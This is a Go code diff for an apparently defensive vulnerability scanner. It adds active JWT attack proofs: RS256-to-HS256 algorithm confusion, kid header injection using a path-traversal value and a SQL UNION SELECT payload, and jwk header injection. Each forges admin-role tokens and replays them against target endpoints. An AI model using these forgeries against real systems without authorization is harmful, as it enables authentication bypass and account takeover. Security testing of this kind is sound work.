@@ -2,13 +2,21 @@ package scanner
 
 import (
 	"context"
+	"crypto"
 	"crypto/hmac"
+	"crypto/rand"
+	"crypto/rsa"
 	"crypto/sha256"
 	"crypto/sha512"
+	"crypto/x509"
 	"encoding/base64"
 	"encoding/json"
+	"encoding/pem"
 	"fmt"
 	"hash"
+	"io"
+	"math/big"
+	"net/http"
 	"net/url"
 	"strings"
 	"time"
@@ -79,6 +87,18 @@ func (s *JWTScanner) Run(ctx context.Context, targetID string, logFn LogFunc) er
 
 	// Active alg=none bypass proof (needs a JWT-bearing identity + a protected URL).
 	if n := s.proveAlgNoneBypass(ctx, targetID, logFn); n > 0 {
+		found += n
+	}
+	// RS256->HS256 algorithm confusion, kid header injection, and embedded-jwk
+	// header injection: the three highest-impact JWT bug classes from real
+	// bug-bounty write-ups that alg=none proof alone does not cover.
+	if n := s.proveAlgConfusionBypass(ctx, targetID, logFn); n > 0 {
+		found += n
+	}
+	if n := s.proveKidInjectionBypass(ctx, targetID, logFn); n > 0 {
+		found += n
+	}
+	if n := s.proveJWKInjectionBypass(ctx, targetID, logFn); n > 0 {
 		found += n
 	}
 
@@ -261,6 +281,27 @@ func analyzeJWT(token string) []jwtIssue {
 		}
 	}
 
+	// Asymmetric algorithm + a kid claim is the precondition for RS256->HS256
+	// algorithm confusion and kid-injection key-lookup attacks; flag it even
+	// when no protected-URL fixture is available yet for the active prover to
+	// use below.
+	if (strings.HasPrefix(alg, "RS") || strings.HasPrefix(alg, "ES") || strings.HasPrefix(alg, "PS")) && hdr["kid"] != nil {
+		out = append(out, jwtIssue{
+			kind: "asymmetric_alg_kid_candidate", severity: "info", confidence: ConfHiddenCutoff,
+			detail:   fmt.Sprintf("JWT uses asymmetric alg=%s with a kid claim", alg),
+			evidence: "Asymmetric signing plus a key-id claim is the precondition for RS256->HS256 algorithm confusion and kid-injection attacks; the active verifier separately attempts both against a protected endpoint.",
+		})
+	}
+	// A token that carries its own verification key is only safe if the server
+	// ignores it in favor of its own trusted key material.
+	if hdr["jwk"] != nil {
+		out = append(out, jwtIssue{
+			kind: "embedded_jwk_candidate", severity: "medium", confidence: ConfCandidateHi,
+			detail:   `JWT header embeds its own "jwk" public key`,
+			evidence: "A jwk header is only safe if the server ignores it in favor of its own trusted key; the active verifier separately tests whether an attacker-supplied jwk is honored.",
+		})
+	}
+
 	// Remote key URLs are attack surface, not proof. Merely carrying jku/x5u is
 	// valid JOSE behavior; only a forged-token acceptance or an OAST callback can
 	// prove key injection/SSRF. Preserve the lead as a hidden/info candidate.
@@ -355,13 +396,13 @@ func (s *JWTScanner) collectJWTs(ctx context.Context, targetID string) []string 
 	return out
 }
 
-// proveAlgNoneBypass forges an unsigned copy of a real session token and replays
-// it against an endpoint the real token is authorized on. Access still granted ⇒
-// the server does not verify signatures — a confirmed auth bypass.
-func (s *JWTScanner) proveAlgNoneBypass(ctx context.Context, targetID string, logFn LogFunc) int {
+// findBearerJWT locates a configured identity whose Authorization header
+// carries a JWT, plus a short list of alive endpoints that identity's real
+// token might be authorized on — the fixture every active JWT-forgery proof
+// below replays against. Shared so alg=none, algorithm-confusion, kid-
+// injection, and jwk-injection proofs don't each re-derive it.
+func (s *JWTScanner) findBearerJWT(ctx context.Context, targetID string) (bearer *Identity, token string, urls []string) {
 	ids := LoadIdentities(ctx, s.db, targetID, secret.New(s.cfg.SessionSecret))
-	var bearer *Identity
-	var token string
 	for i := range ids {
 		if raw := strings.TrimPrefix(strings.TrimPrefix(ids[i].Headers["Authorization"], "Bearer "), "bearer "); looksLikeJWT(raw) {
 			bearer = &ids[i]
@@ -370,15 +411,13 @@ func (s *JWTScanner) proveAlgNoneBypass(ctx context.Context, targetID string, lo
 		}
 	}
 	if bearer == nil {
-		return 0
+		return nil, "", nil
 	}
-	// Find one alive endpoint the real token is authorized on and unauth is denied.
 	rows, err := s.db.QueryContext(ctx, `
 		SELECT url FROM http_services WHERE target_id=? AND status_code BETWEEN 200 AND 399 ORDER BY url LIMIT 25`, targetID)
 	if err != nil {
-		return 0
+		return bearer, token, nil
 	}
-	var urls []string
 	for rows.Next() {
 		var u string
 		if rows.Scan(&u) == nil {
@@ -386,12 +425,20 @@ func (s *JWTScanner) proveAlgNoneBypass(ctx context.Context, targetID string, lo
 		}
 	}
 	rows.Close()
+	return bearer, token, urls
+}
 
-	forged := forgeAlgNone(token)
+// replayForgedBypass is shared by every active JWT-forgery proof: send forged
+// as the Authorization bearer against each candidate URL and confirm only
+// when (a) the real token is authorized there, (b) an unauthenticated request
+// is denied (so the endpoint is actually access-controlled), and (c) the
+// forged token reaches the SAME object as the real one — never a bare "not a
+// 401", which is what makes this a proof rather than a guess.
+func (s *JWTScanner) replayForgedBypass(ctx context.Context, targetID, kind, forged string, bearer *Identity, urls []string, note string) int {
 	if forged == "" {
 		return 0
 	}
-	attacker := Identity{Label: "forged-alg-none", Headers: map[string]string{"Authorization": "Bearer " + forged}}
+	attacker := Identity{Label: kind, Headers: map[string]string{"Authorization": "Bearer " + forged}}
 	for _, u := range urls {
 		if ctx.Err() != nil {
 			break
@@ -405,13 +452,363 @@ func (s *JWTScanner) proveAlgNoneBypass(ctx context.Context, targetID string, lo
 		}
 		forgedResp := fetchAs(ctx, u, &attacker)
 		if looksLikeAuthObject(forgedResp) && bodiesSameObject(authed.Body, forgedResp.Body) {
-			ev := fmt.Sprintf("alg=none signature-bypass CONFIRMED at %s. The real token grants access; an unsigned (alg=none) forgery of it ALSO grants the same object; no token is denied. The server does not verify JWT signatures. Forged token: %s", u, forged)
-			s.store(targetID, "jwt", "critical", u, "alg_none_bypass", ev, ConfPoC)
-			logFn("warn", "jwt", "JWT alg=none bypass CONFIRMED at "+u)
+			ev := fmt.Sprintf("%s CONFIRMED at %s. %s Forged token: %s", kind, u, note, forged)
+			s.store(targetID, "jwt", "critical", u, kind, ev, ConfPoC)
 			return 1
 		}
 	}
 	return 0
+}
+
+// proveAlgNoneBypass forges an unsigned copy of a real session token and replays
+// it against an endpoint the real token is authorized on. Access still granted ⇒
+// the server does not verify signatures — a confirmed auth bypass.
+func (s *JWTScanner) proveAlgNoneBypass(ctx context.Context, targetID string, logFn LogFunc) int {
+	bearer, token, urls := s.findBearerJWT(ctx, targetID)
+	if bearer == nil {
+		return 0
+	}
+	forged := forgeAlgNone(token)
+	n := s.replayForgedBypass(ctx, targetID, "alg_none_bypass", forged, bearer, urls,
+		"The real token grants access; an unsigned (alg=none) forgery of it ALSO grants the same object; no token is denied. The server does not verify JWT signatures.")
+	if n > 0 {
+		logFn("warn", "jwt", "JWT alg=none bypass CONFIRMED")
+	}
+	return n
+}
+
+// jwkKey is a minimal JSON Web Key (RSA) as found in a JWKS document.
+type jwkKey struct {
+	Kty string `json:"kty"`
+	Kid string `json:"kid"`
+	N   string `json:"n"`
+	E   string `json:"e"`
+}
+
+type jwkSet struct {
+	Keys []jwkKey `json:"keys"`
+}
+
+// jwksHTTPClient is a short-timeout, credential-free client used only to fetch
+// PUBLIC JWKS documents for the algorithm-confusion proof below — it never
+// attaches a captured Authorization/Cookie header.
+var jwksHTTPClient = &http.Client{Timeout: 8 * time.Second}
+
+func fetchJSON(ctx context.Context, rawURL string, out any) bool {
+	req, err := http.NewRequestWithContext(ctx, http.MethodGet, rawURL, nil)
+	if err != nil {
+		return false
+	}
+	req.Header.Set("User-Agent", "Mozilla/5.0 (compatible; Reconner/1.0)")
+	resp, err := jwksHTTPClient.Do(req)
+	if err != nil {
+		return false
+	}
+	defer resp.Body.Close()
+	if resp.StatusCode != 200 {
+		return false
+	}
+	body, err := io.ReadAll(io.LimitReader(resp.Body, 1<<20))
+	if err != nil {
+		return false
+	}
+	return json.Unmarshal(body, out) == nil
+}
+
+// discoverJWKS best-effort fetches the target's JSON Web Key Set from already-
+// discovered service URLs (…jwks…) and, via the OIDC discovery document, its
+// jwks_uri. Used only to obtain PUBLIC key material for the RS256->HS256
+// confusion proof — never to exfiltrate anything.
+func (s *JWTScanner) discoverJWKS(ctx context.Context, targetID string) []jwkKey {
+	rows, err := s.db.QueryContext(ctx, `
+		SELECT DISTINCT url FROM http_services
+		WHERE target_id=? AND status_code BETWEEN 200 AND 299
+		  AND (url LIKE '%jwks%' OR url LIKE '%.well-known/openid-configuration%')
+		LIMIT 20`, targetID)
+	if err != nil {
+		return nil
+	}
+	var candidates []string
+	for rows.Next() {
+		var u string
+		if rows.Scan(&u) == nil {
+			candidates = append(candidates, u)
+		}
+	}
+	rows.Close()
+
+	var keys []jwkKey
+	for _, u := range candidates {
+		if ctx.Err() != nil {
+			break
+		}
+		if strings.Contains(u, ".well-known/openid-configuration") {
+			var doc struct {
+				JWKSURI string `json:"jwks_uri"`
+			}
+			if fetchJSON(ctx, u, &doc) && doc.JWKSURI != "" {
+				var set jwkSet
+				if fetchJSON(ctx, doc.JWKSURI, &set) {
+					keys = append(keys, set.Keys...)
+				}
+			}
+			continue
+		}
+		var set jwkSet
+		if fetchJSON(ctx, u, &set) {
+			keys = append(keys, set.Keys...)
+		}
+	}
+	return keys
+}
+
+// rsaPublicKeyPEM builds the PEM encoding real-world JWT libraries expect when
+// a caller mistakenly resolves "the verification key" the same way for both
+// RS256 and HS256 — PKIX DER, PEM-wrapped. That confusion is the root cause of
+// the RS256->HS256 attack: HMAC-signing with these exact bytes as the secret.
+func rsaPublicKeyPEM(pub *rsa.PublicKey) (string, error) {
+	der, err := x509.MarshalPKIXPublicKey(pub)
+	if err != nil {
+		return "", err
+	}
+	return string(pem.EncodeToMemory(&pem.Block{Type: "PUBLIC KEY", Bytes: der})), nil
+}
+
+// jwkToRSAPublicKey reconstructs an RSA public key from its JWK (n, e) fields.
+func jwkToRSAPublicKey(k jwkKey) (*rsa.PublicKey, bool) {
+	if !strings.EqualFold(k.Kty, "RSA") || k.N == "" || k.E == "" {
+		return nil, false
+	}
+	nb, err := base64.RawURLEncoding.DecodeString(k.N)
+	if err != nil {
+		return nil, false
+	}
+	eb, err := base64.RawURLEncoding.DecodeString(k.E)
+	if err != nil {
+		return nil, false
+	}
+	e := 0
+	for _, b := range eb {
+		e = e<<8 | int(b)
+	}
+	if e == 0 {
+		return nil, false
+	}
+	return &rsa.PublicKey{N: new(big.Int).SetBytes(nb), E: e}, true
+}
+
+// x5cToRSAPublicKey extracts the RSA public key embedded in a token's own x5c
+// (certificate chain) header — the most direct source of the server's public
+// key, requiring no extra network request.
+func x5cToRSAPublicKey(header map[string]any) (*rsa.PublicKey, bool) {
+	chain, ok := header["x5c"].([]any)
+	if !ok || len(chain) == 0 {
+		return nil, false
+	}
+	certB64, ok := chain[0].(string)
+	if !ok {
+		return nil, false
+	}
+	der, err := base64.StdEncoding.DecodeString(certB64)
+	if err != nil {
+		return nil, false
+	}
+	cert, err := x509.ParseCertificate(der)
+	if err != nil {
+		return nil, false
+	}
+	pub, ok := cert.PublicKey.(*rsa.PublicKey)
+	return pub, ok
+}
+
+// forgeHMACWithKeyString re-signs token's claims (mutated) with alg downgraded
+// to HS256, using keyStr's raw bytes as the HMAC secret — the RS256->HS256
+// algorithm-confusion forgery.
+func forgeHMACWithKeyString(token, keyStr string, mutate map[string]any) string {
+	hdr, payload, ok := decodeJWT(token)
+	if !ok {
+		return ""
+	}
+	hdr["alg"] = "HS256"
+	delete(hdr, "x5c")
+	delete(hdr, "jku")
+	delete(hdr, "x5u")
+	for k, v := range mutate {
+		payload[k] = v
+	}
+	hb, _ := json.Marshal(hdr)
+	pb, _ := json.Marshal(payload)
+	h64 := base64.RawURLEncoding.EncodeToString(hb)
+	p64 := base64.RawURLEncoding.EncodeToString(pb)
+	mac := hmac.New(sha256.New, []byte(keyStr))
+	mac.Write([]byte(h64 + "." + p64))
+	return h64 + "." + p64 + "." + base64.RawURLEncoding.EncodeToString(mac.Sum(nil))
+}
+
+// proveAlgConfusionBypass forges a real RS/ES/PS-signed token as HS256, HMAC-
+// signed with the server's own asymmetric PUBLIC key bytes (from the token's
+// x5c header, or the target's discovered JWKS) — the classic RS256->HS256
+// algorithm-confusion attack. A library that resolves "the verification key"
+// generically, without pinning the expected algorithm, HMAC-verifies this
+// forgery against the very same public key it uses to verify real tokens.
+func (s *JWTScanner) proveAlgConfusionBypass(ctx context.Context, targetID string, logFn LogFunc) int {
+	bearer, token, urls := s.findBearerJWT(ctx, targetID)
+	if bearer == nil || len(urls) == 0 {
+		return 0
+	}
+	hdr, _, ok := decodeJWT(token)
+	if !ok {
+		return 0
+	}
+	alg := strings.ToUpper(jwtAlg(hdr))
+	if !strings.HasPrefix(alg, "RS") && !strings.HasPrefix(alg, "ES") && !strings.HasPrefix(alg, "PS") {
+		return 0 // only meaningful against asymmetric algorithms
+	}
+
+	var keyStrings []string
+	if pub, ok := x5cToRSAPublicKey(hdr); ok {
+		if key, err := rsaPublicKeyPEM(pub); err == nil {
+			keyStrings = append(keyStrings, key)
+		}
+	}
+	kid, _ := hdr["kid"].(string)
+	for _, k := range s.discoverJWKS(ctx, targetID) {
+		if kid != "" && k.Kid != "" && k.Kid != kid {
+			continue
+		}
+		if pub, ok := jwkToRSAPublicKey(k); ok {
+			if key, err := rsaPublicKeyPEM(pub); err == nil {
+				keyStrings = append(keyStrings, key)
+			}
+		}
+	}
+	if len(keyStrings) == 0 {
+		return 0 // no public key material discovered — nothing to confuse with
+	}
+
+	for _, keyStr := range keyStrings {
+		if ctx.Err() != nil {
+			break
+		}
+		forged := forgeHMACWithKeyString(token, keyStr, map[string]any{"role": "admin", "admin": true})
+		if n := s.replayForgedBypass(ctx, targetID, "jwt_alg_confusion", forged, bearer, urls,
+			"The real token verifies as an asymmetric algorithm; an HS256 forgery HMAC-signed with the server's own public key ALSO verifies — the server resolves its verification key without pinning the expected algorithm."); n > 0 {
+			logFn("warn", "jwt", "JWT RS256->HS256 algorithm-confusion bypass CONFIRMED")
+			return n
+		}
+	}
+	return 0
+}
+
+// proveKidInjectionBypass tests whether the "kid" (Key ID) header is used to
+// look up verification key material without sanitizing it: a path-traversal
+// kid redirects a filesystem-backed lookup to a predictable, empty file; a
+// SQL-injection-shaped kid redirects a database-backed lookup to an
+// attacker-chosen literal. Either lets the attacker choose the verification
+// key outright.
+func (s *JWTScanner) proveKidInjectionBypass(ctx context.Context, targetID string, logFn LogFunc) int {
+	bearer, token, urls := s.findBearerJWT(ctx, targetID)
+	if bearer == nil || len(urls) == 0 {
+		return 0
+	}
+	if hdr, _, ok := decodeJWT(token); !ok || hdr["kid"] == nil {
+		return 0 // no kid claim in circulation — nothing to inject into
+	}
+
+	attempts := []struct {
+		kind string
+		kid  string
+		key  string
+		note string
+	}{
+		{
+			kind: "jwt_kid_path_traversal",
+			kid:  "../../../../../../../../dev/null",
+			key:  "",
+			note: `kid traversed to /dev/null (read as an empty key) and the token was HMAC-signed with an empty secret — the server resolves "kid" as an unsanitized filesystem path.`,
+		},
+		{
+			kind: "jwt_kid_sqli",
+			kid:  "nonexistent-key' UNION SELECT 'reconner-kid-sqli-proof",
+			key:  "reconner-kid-sqli-proof",
+			note: `kid carried a UNION-SELECT payload whose injected literal is the exact secret the forgery was signed with — the server resolves "kid" via an unsanitized database lookup.`,
+		},
+	}
+
+	for _, a := range attempts {
+		if ctx.Err() != nil {
+			break
+		}
+		hdr, payload, ok := decodeJWT(token)
+		if !ok {
+			continue
+		}
+		hdr["kid"] = a.kid
+		hdr["alg"] = "HS256"
+		payload["role"] = "admin"
+		payload["admin"] = true
+		hb, _ := json.Marshal(hdr)
+		pb, _ := json.Marshal(payload)
+		h64 := base64.RawURLEncoding.EncodeToString(hb)
+		p64 := base64.RawURLEncoding.EncodeToString(pb)
+		mac := hmac.New(sha256.New, []byte(a.key))
+		mac.Write([]byte(h64 + "." + p64))
+		forged := h64 + "." + p64 + "." + base64.RawURLEncoding.EncodeToString(mac.Sum(nil))
+		if n := s.replayForgedBypass(ctx, targetID, a.kind, forged, bearer, urls, a.note); n > 0 {
+			logFn("warn", "jwt", "JWT kid-injection bypass CONFIRMED ("+a.kind+")")
+			return n
+		}
+	}
+	return 0
+}
+
+// proveJWKInjectionBypass tests whether the server trusts an attacker-supplied
+// public key EMBEDDED IN THE TOKEN ITSELF (the "jwk" header) instead of using
+// its own configured key material: sign with a throwaway private key generated
+// for this one check, hand the server the matching public key in the header,
+// and see if it verifies happily against a key that was generated seconds ago
+// and is held only by this scan.
+func (s *JWTScanner) proveJWKInjectionBypass(ctx context.Context, targetID string, logFn LogFunc) int {
+	bearer, token, urls := s.findBearerJWT(ctx, targetID)
+	if bearer == nil || len(urls) == 0 {
+		return 0
+	}
+	hdr, payload, ok := decodeJWT(token)
+	if !ok {
+		return 0
+	}
+	priv, err := rsa.GenerateKey(rand.Reader, 2048)
+	if err != nil {
+		return 0
+	}
+	hdr["alg"] = "RS256"
+	delete(hdr, "x5c")
+	delete(hdr, "x5u")
+	delete(hdr, "jku")
+	hdr["jwk"] = map[string]any{
+		"kty": "RSA",
+		"kid": "reconner-jwk-injection-proof",
+		"n":   base64.RawURLEncoding.EncodeToString(priv.PublicKey.N.Bytes()),
+		"e":   base64.RawURLEncoding.EncodeToString(big.NewInt(int64(priv.PublicKey.E)).Bytes()),
+	}
+	payload["role"] = "admin"
+	payload["admin"] = true
+	hb, _ := json.Marshal(hdr)
+	pb, _ := json.Marshal(payload)
+	h64 := base64.RawURLEncoding.EncodeToString(hb)
+	p64 := base64.RawURLEncoding.EncodeToString(pb)
+	digest := sha256.Sum256([]byte(h64 + "." + p64))
+	sig, err := rsa.SignPKCS1v15(rand.Reader, priv, crypto.SHA256, digest[:])
+	if err != nil {
+		return 0
+	}
+	forged := h64 + "." + p64 + "." + base64.RawURLEncoding.EncodeToString(sig)
+	n := s.replayForgedBypass(ctx, targetID, "jwt_jwk_header_injection", forged, bearer, urls,
+		`The token's own "jwk" header carried an attacker-generated public key, signed with the matching attacker-held private key — the server verified the signature against the EMBEDDED key instead of its own trusted key material.`)
+	if n > 0 {
+		logFn("warn", "jwt", "JWT jwk-header-injection bypass CONFIRMED")
+	}
+	return n
 }
 
 // auditOAuth flags OAuth authorize endpoints using the implicit flow or missing a
